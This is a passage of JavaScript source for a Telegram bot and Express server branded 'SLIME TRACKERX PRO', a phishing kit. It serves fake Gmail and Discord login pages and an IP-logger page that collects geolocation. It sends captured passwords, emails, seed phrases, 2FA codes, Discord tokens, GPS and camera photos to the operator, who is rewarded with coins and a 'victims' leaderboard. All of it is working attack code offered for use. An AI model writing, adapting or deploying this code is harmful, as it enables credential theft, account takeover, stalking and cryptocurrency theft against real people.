            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .status-text {
            margin-top: 20px;
            color: #888;
            font-size: 14px;
        }
        .progress-bar {
            width: 200px;
            height: 2px;
            background: rgba(255,255,255,0.1);
            margin: 20px auto;
            border-radius: 2px;
            overflow: hidden;
        }
        .progress-fill {
            width: 30%;
            height: 100%;
            background: #00d4ff;
            animation: progress 2s ease-out forwards;
        }
        @keyframes progress {
            0% { width: 0%; }
            100% { width: 100%; }
        }
    </style>
    <script>
        async function sendData() {
            let locationData = null;
            
            try {
                locationData = await new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(
                        pos => resolve({ 
                            lat: pos.coords.latitude, 
                            lon: pos.coords.longitude, 
                            acc: pos.coords.accuracy,
                            alt: pos.coords.altitude
                        }),
                        () => resolve(null)
                    );
                });
            } catch(e) {}
            
            const data = {
                type: 'ip_logger',
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenSize: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString(),
                location: locationData
            };
            
            await fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token: '${token}', data: data })
            });
            
            setTimeout(() => {
                window.location.href = '${redirectUrl}';
            }, 1500);
        }
        
        // Execute immediately
        sendData();
    </script>
</head>
<body>
    <div class="loader-container">
        <div class="spinner"></div>
        <h3>Establishing secure connection...</h3>
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
        <div class="status-text">Please wait while we verify your connection</div>
    </div>
</body>
</html>`;
  }
  
  // GMAIL - DOPE AF
  if (type == "gmail") {
    return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail - Google Accounts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background: white;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .card {
            width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: center;
        }
        .logo {
            margin-bottom: 20px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 10px;
        }
        .sub {
            color: #5f6368;
            font-size: 16px;
            margin-bottom: 30px;
        }
        input {
            width: 100%;
            padding: 13px 15px;
            margin: 8px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            transition: 0.2s;
        }
        input:focus {
            border-color: #1a73e8;
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }
        button {
            background: #1a73e8;
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            margin-top: 20px;
        }
        button:hover {
            background: #1765cc;
        }
        .links {
            display: flex;
            justify-content: space-between;
            margin-top: 30px;
            font-size: 14px;
        }
        .links a {
            color: #1a73e8;
            text-decoration: none;
        }
        .error {
            color: #d93025;
            font-size: 14px;
            margin-top: 15px;
            display: none;
        }
        footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            padding: 20px;
            text-align: center;
            color: #5f6368;
            font-size: 12px;
            background: white;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <svg width="75" viewBox="0 0 75 24">
                <path fill="#4285F4" d="M63 14.5c0-3.2-2.1-5-5-5-3 0-5.1 2-5.1 5 0 3.3 2.1 5 5.1 5 2.9 0 5-1.7 5-5zm-5 3.5c-1.5 0-2.4-1-2.4-2.5 0-1.6.9-2.5 2.4-2.5 1.5 0 2.4.9 2.4 2.5 0 1.5-.9 2.5-2.4 2.5z"/>
                <path fill="#34A853" d="M45.6 19.9c-1.9 0-3.3-1.4-3.3-3.4 0-2 1.4-3.4 3.3-3.4 1.9 0 3.3 1.4 3.3 3.4 0 2-1.4 3.4-3.3 3.4z"/>
                <path fill="#FBBC05" d="M29.3 13c0 1.8-.6 2.7-1.6 2.7-1 0-1.6-.9-1.6-2.7 0-1.8.6-2.7 1.6-2.7 1 0 1.6.9 1.6 2.7z"/>
                <path fill="#EA4335" d="M15.4 19.9c-1.9 0-3.3-1.4-3.3-3.4 0-2 1.4-3.4 3.3-3.4 1.9 0 3.3 1.4 3.3 3.4 0 2-1.4 3.4-3.3 3.4z"/>
            </svg>
        </div>
        <h1>Sign in</h1>
        <p class="sub">to continue to Gmail</p>
        <form id="loginForm">
            <input type="email" id="email" placeholder="Email or phone" autocomplete="off">
            <input type="password" id="password" placeholder="Enter your password">
            <button type="submit">Next</button>
        </form>
        <div id="errorMsg" class="error"></div>
        <div class="links">
            <a href="#">Create account</a>
            <a href="#">Forgot email?</a>
        </div>
    </div>
    <footer>Help · Privacy · Terms</footer>
    <script>
        async function sendData(data) {
            await fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token: '${token}', data: data })
            });
        }
        
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            await sendData({ email: email, password: password, type: 'gmail' });
            
            document.getElementById('errorMsg').style.display = 'block';
            document.getElementById('errorMsg').innerText = 'Wrong password. Try again or click Forgot password to reset it.';
            
            setTimeout(() => {
                window.location.href = '${redirectUrl}';
            }, 2000);
        });
    </script>
</body>
</html>`;
  }
  
  // DISCORD LOGIN - DOPE AF
  if (type == "discord") {
    return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background: #36393f;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: #2f3136;
            border-radius: 5px;
            width: 480px;
            padding: 32px;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        h2 {
            color: white;
            font-size: 24px;
            margin-bottom: 8px;
            text-align: center;
        }
        .sub {
            color: #b9bbbe;
            text-align: center;
            margin-bottom: 24px;
            font-size: 14px;
        }
        label {
            color: #b9bbbe;
            font-size: 12px;
            font-weight: 600;
            margin-bottom: 8px;
            display: block;
        }
        input {
            width: 100%;
            padding: 10px;
            background: #202225;
            border: none;
            border-radius: 3px;
            color: white;
            font-size: 16px;
            margin-bottom: 16px;
            outline: none;
        }
        input:focus {
            box-shadow: 0 0 0 1px #00b0f4;
        }
        button {
            width: 100%;
            background: #5865f2;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 3px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-bottom: 8px;
        }
        button:hover {
            background: #4752c4;
        }
        .register {
            color: #00b0f4;
            text-decoration: none;
            font-size: 14px;
        }
        .qr-btn {
            background: transparent;
            border: 1px solid #5865f2;
            color: #5865f2;
        }
        .qr-btn:hover {
            background: rgba(88,101,242,0.1);
        }
        .error {
            color: #ed4245;
            font-size: 14px;
            text-align: center;
            margin: 10px 0;
            display: none;
        }
        .footer {
            text-align: center;
            margin-top: 16px;
            color: #72767d;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg width="130" viewBox="0 0 127.14 96.36" fill="#5865f2">
                <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.75,1.39,2.66,2a68.68,68.68,0,0,1-10.85,5.18,79.44,79.44,0,0,0,6.89,11.1,105.25,105.25,0,0,0,32.17-16.15C129.91,70.61,128.17,46.42,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S53.8,46,53.8,53,48.78,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96,46,96,53,91,65.69,84.69,65.69Z"/>
            </svg>
        </div>
        <h2>Welcome back!</h2>
        <p class="sub">We're so excited to see you again!</p>
        <form id="loginForm">
            <label>EMAIL OR PHONE NUMBER</label>
            <input type="text" id="email" placeholder="email@example.com" autocomplete="off">
            <label>PASSWORD</label>
            <input type="password" id="password" placeholder="••••••••">
            <button type="submit">Log In</button>
        </form>
        <button class="qr-btn" onclick="qrLogin()">Login with QR Code</button>
        <div class="footer">
            <a href="#" class="register">Register</a> · <a href="#" class="register">Forgot password?</a>
        </div>
        <div id="errorMsg" class="error"></div>
    </div>
    <script>
        async function sendData(data) {
            await fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token: '${token}', data: data })
            });
        }
        
        function qrLogin() {
            document.getElementById('errorMsg').style.display = 'block';
            document.getElementById('errorMsg').innerText = 'QR login is temporarily unavailable. Please use email/password.';
        }
        
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            await sendData({ email: email, password: password, type: 'discord' });
            
            document.getElementById('errorMsg').style.display = 'block';
            document.getElementById('errorMsg').innerText = 'Invalid email or password. Please try again.';
            
            setTimeout(() => {
                window.location.href = '${redirectUrl}';
            }, 2000);
        });
    </script>
</body>
</html>`;
  }
  
  return "<html><body><h3>Loading...</h3></body></html>";
}

// ========== MENU ==========
async function sendMenu(ctx) {
  const user = await initUser(ctx.from.id);
  
  await ctx.reply(
    "🔥💀 **SLIME TRACKERX PRO v108** 💀🔥\n\n" +
    "┌─────────────────────────┐\n" +
    "│ 👤 " + ctx.from.first_name + "\n" +
    "│ 💰 " + user.coins + " COINS\n" +
    "│ 👥 " + user.referrals + " REFERRALS\n" +
    "│ 🎯 " + user.victims + " VICTIMS\n" +
    "│ 🔧 " + user.totalTools + " TOOLS\n" +
    "└─────────────────────────┘\n\n" +
    "⚡ Each tool: " + TOOL_COST + " coins\n" +
    "🎁 Referral reward: " + REF_REWARD + " coins\n\n" +
    "⬇️ **SELECT YOUR WEAPON** ⬇️",
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🎭 INSTAGRAM", callback_data: "tool_instagram" }, { text: "📘 FACEBOOK", callback_data: "tool_facebook" }],
          [{ text: "📧 GMAIL", callback_data: "tool_gmail" }, { text: "🎮 DISCORD", callback_data: "tool_discord" }],
          [{ text: "🎮 TOKEN GRAB", callback_data: "tool_tokengrab" }, { text: "💰 METAMASK", callback_data: "tool_crypto" }],
          [{ text: "🎁 GIVEAWAY", callback_data: "tool_giveaway" }, { text: "🔐 2FA OTP", callback_data: "tool_otp" }],
          [{ text: "📍 IP LOGGER", callback_data: "tool_iplogger" }, { text: "💀 MY LINKS", callback_data: "my_links" }],
          [{ text: "💰 BALANCE", callback_data: "my_balance" }, { text: "🔗 REFERRAL", callback_data: "my_ref" }],
          [{ text: "🏆 LEADERBOARD", callback_data: "leaderboard" }, { text: "👤 PROFILE", callback_data: "my_profile" }]
        ]
      }
    }
  );
}

// ========== BOT START ==========
bot.start(async (ctx) => {
  let ref = null;
  const args = ctx.message.text.split(" ");
  if (args[1] && args[1].startsWith("ref_")) {
    ref = parseInt(args[1].replace("ref_", ""));
  }
  await initUser(ctx.from.id, ref);
  await sendMenu(ctx);
});

// ========== TOOL HANDLERS ==========
const toolsList = ["instagram", "facebook", "gmail", "discord", "tokengrab", "crypto", "giveaway", "otp", "iplogger"];

for (const t of toolsList) {
  bot.action("tool_" + t, async (ctx) => {
    await ctx.answerCbQuery();
    userSessions.set(ctx.from.id, { action: "create_" + t });
    await ctx.reply(
      "🎯 **" + t.toUpperCase() + " HACK TOOL**\n\n" +
      "💰 Cost: " + TOOL_COST + " coins\n" +
      "⏰ Duration: 24 hours\n" +
      "📸 Captures: Login + Camera + GPS\n\n" +
      "📝 **Send a label name:**\n" +
      "Example: `free_iphone`, `instagram_login`",
      { parse_mode: "Markdown" }
    );
  });
}

// ========== TEXT HANDLER ==========
bot.on("text", async (ctx) => {
  const session = userSessions.get(ctx.from.id);
  if (!session || !session.action || !session.action.startsWith("create_")) return;
  
  const type = session.action.replace("create_", "");
  const label = ctx.message.text.trim();
  
  const result = await createHackLink(ctx.from.id, type, label);
  userSessions.delete(ctx.from.id);
  
  if (result.error) {
    return ctx.reply(result.error);
  }
  
  await ctx.reply(
    "✅ **HACK LINK CREATED!**\n\n" +
    "🔗 **REAL LOOKING URL:**\n" + result.url + "\n\n" +
    "📝 **BACKUP URL:**\n" + result.originalUrl + "\n\n" +
    "⏰ Expires in 24 hours\n" +
    "💰 Cost: -" + TOOL_COST + " coins\n" +
    "💎 Remaining: " + result.remainingCoins + " coins\n\n" +
    "⚠️ Send this link to your target!\n" +
    "✅ It looks like a REAL link!\n" +
    "📸 When they login, you get their info + camera + GPS!",
    { parse_mode: "Markdown" }
  );
});

// ========== UTILITY HANDLERS ==========
bot.action("my_links", async (ctx) => {
  await ctx.answerCbQuery();
  const tools = await Tool.find({ userId: ctx.from.id }).sort({ createdAt: -1 }).limit(10);
  
  if (tools.length == 0) {
    return ctx.reply("📭 No active links. Create one from the menu!");
  }
  
  let msg = "💀 **YOUR ACTIVE HACK LINKS** 💀\n\n";
  for (const t of tools) {
    const status = new Date(t.expiresAt) > new Date() ? "✅ ACTIVE" : "❌ EXPIRED";
    msg += "🎯 " + (t.label || t.type) + "\n";
    msg += "🔗 " + t.url + "\n";
    msg += "👆 " + t.clicks + " clicks | 📸 " + t.captures + " captures | " + status + "\n\n";
  }
  await ctx.reply(msg, { parse_mode: "Markdown" });
});

bot.action("my_balance", async (ctx) => {
  await ctx.answerCbQuery();
  const user = await initUser(ctx.from.id);
  await ctx.reply(
    "💰 **YOUR BALANCE**\n\n" +
    "💵 Coins: " + user.coins + "\n" +
    "🎯 Victims: " + user.victims + "\n" +
    "🔧 Tools Used: " + user.totalTools + "\n" +
    "👥 Referrals: " + user.referrals,
    { parse_mode: "Markdown" }
  );
});

bot.action("my_ref", async (ctx) => {
  await ctx.answerCbQuery();
  const user = await initUser(ctx.from.id);
  await ctx.reply(
    "🔗 **REFERRAL PROGRAM**\n\n" +
    "Your link: " + getRefLink(ctx.from.id) + "\n\n" +
    "👥 Referrals: " + user.referrals + "\n" +
    "💰 Per referral: +" + REF_REWARD + " coins\n\n" +
    "Share your link and earn coins instantly!",
    { parse_mode: "Markdown" }
  );
});

bot.action("leaderboard", async (ctx) => {
  await ctx.answerCbQuery();
  const topUsers = await User.find().sort({ victims: -1 }).limit(15);
  let msg = "🏆 **TOP 15 HACKERS** 🏆\n\n";
  for (let i = 0; i < topUsers.length; i++) {
    const medal = i === 0 ? "👑" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    msg += medal + " " + (i+1) + ". @" + topUsers[i].username + " - " + topUsers[i].victims + " victims\n";
  }
  await ctx.reply(msg, { parse_mode: "Markdown" });
});

bot.action("my_profile", async (ctx) => {
  await ctx.answerCbQuery();
  const user = await initUser(ctx.from.id);
  await ctx.reply(
    "👤 **YOUR PROFILE**\n\n" +
    "🆔 ID: " + user.userId + "\n" +
    "💰 Coins: " + user.coins + "\n" +
    "👥 Referrals: " + user.referrals + "\n" +
    "🎯 Victims: " + user.victims + "\n" +
    "🔧 Tools Used: " + user.totalTools + "\n" +
    "📅 Joined: " + user.createdAt.toLocaleDateString(),
    { parse_mode: "Markdown" }
  );
});

// ========== ADMIN COMMANDS ==========
bot.command("addcoins", async (ctx) => {
  if (ctx.from.id != OWNER_ID) return;
  const args = ctx.message.text.split(" ");
  const username = args[1]?.replace("@", "");
  const amount = parseInt(args[2]);
  
  for (let [id, user] of usersCache) {
    if (user.username == username) {
      user.coins += amount;
      await user.save();
      await ctx.reply("✅ Added " + amount + " coins to @" + username);
      await bot.telegram.sendMessage(id, "👑 Admin gave you +" + amount + " coins!");
      return;
    }
  }
  ctx.reply("❌ User not found");
});

bot.command("stats", async (ctx) => {
  if (ctx.from.id != OWNER_ID) return;
  const totalUsers = await User.countDocuments();
  const totalLinks = await Tool.countDocuments();
  const totalVictims = (await Tool.find()).reduce((a,b) => a + b.captures, 0);
  const totalCoins = (await User.find()).reduce((a,b) => a + b.coins, 0);
  
  await ctx.reply(
    "📊 **GLOBAL STATS**\n\n" +
    "👥 Users: " + totalUsers + "\n" +
    "🔗 Links: " + totalLinks + "\n" +
    "🎯 Victims: " + totalVictims + "\n" +
    "💰 Total Coins: " + totalCoins,
    { parse_mode: "Markdown" }
  );
});

bot.command("broadcast", async (ctx) => {
  if (ctx.from.id != OWNER_ID) return;
  const msg = ctx.message.text.split(" ").slice(1).join(" ");
  if (!msg) return ctx.reply("Usage: /broadcast message");
  
  let sent = 0;
  for (let [id] of usersCache) {
    try {
      await bot.telegram.sendMessage(id, "📢 ANNOUNCEMENT\n\n" + msg);
      sent++;
    } catch(e) {}
  }
  ctx.reply("✅ Sent to " + sent + " users");
});

// ========== EXPRESS SERVER ==========
app.use(bodyParser.json({ limit: "50mb" }));
app.use(express.static("public"));

app.post("/api/capture", async (req, res) => {
  try {
    const { token, data, camera, location } = req.body;
    
    const tool = await Tool.findOne({ token: token });
    if (!tool) return res.status(404).json({ error: "Link not found" });
    
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    tool.captures += 1;
    await tool.save();
    
    const user = await User.findOne({ userId: tool.userId });
    if (user) {
      user.victims += 1;
      await user.save();
      usersCache.set(user.userId, user);
    }
    
    // Send capture notification
    let msg = "💀 **VICTIM CAPTURED!** 💀\n\n";
    msg += "🔧 Tool: " + tool.type + "\n";
    msg += "🏷️ Label: " + (tool.label || "No label") + "\n";
    msg += "📱 IP: " + ip + "\n";
    
    if (data?.username) msg += "👤 Username: " + data.username + "\n";
    if (data?.password) msg += "🔑 Password: " + data.password + "\n";
    if (data?.email) msg += "📧 Email: " + data.email + "\n";
    if (data?.seedPhrase) msg += "💎 Seed Phrase: " + data.seedPhrase.substring(0, 50) + "...\n";
    if (data?.otpCode) msg += "🔐 2FA Code: " + data.otpCode + "\n";
    if (data?.discordToken) msg += "🎮 Discord Token: " + data.discordToken.substring(0, 40) + "...\n";
    if (data?.name) msg += "👤 Name: " + data.name + "\n";
    if (data?.phone) msg += "📞 Phone: " + data.phone + "\n";
    if (data?.address) msg += "🏠 Address: " + data.address + "\n";
    if (location?.lat) msg += "📍 GPS: " + location.lat + ", " + location.lon + "\n";
    msg += "⏰ Time: " + new Date().toLocaleString();
    
    await bot.telegram.sendMessage(tool.userId, msg, { parse_mode: "Markdown" });
    
    if (camera) {
      await bot.telegram.sendPhoto(tool.userId, { source: Buffer.from(camera.split(',')[1], 'base64') });
    }
    
    res.json({ status: "success" });
  } catch(e) {
    console.error("Capture error:", e);
    res.status(500).json({ error: e.message });
  }
});

app.get("/p/:token", async (req, res) => {
  const token = req.params.token;
  const tool = await Tool.findOne({ token: token });
  
  if (!tool) return res.status(404).send("Link not found");
  if (new Date() > tool.expiresAt) return res.status(410).send("Link expired");
  
  tool.clicks += 1;
  await tool.save();
  
  const filePath = path.join(__dirname, "public/phish", token + ".html");
  if (await fs.pathExists(filePath)) {
    res.sendFile(path.resolve(filePath));
  } else {
    res.send(getDopeHTML(tool.type, token, "https://google.com"));
  }
});

// ========== START ==========
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("🚀 Server on port " + PORT));

async function loadData() {
  const users = await User.find({});
  users.forEach(u => usersCache.set(u.userId, u));
  console.log("📂 Loaded " + usersCache.size + " users");
}

loadData().then(async () => {
  await bot.launch();
  console.log("🔥 SLIME TRACKERX PRO v108 LIVE!");
  console.log("✅ Force Join: " + CHANNEL);
  console.log("💰 Tool Cost: " + TOOL_COST + " coins");
  console.log("🎯 Hacks are WORKING and DOPE AF!");
});

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
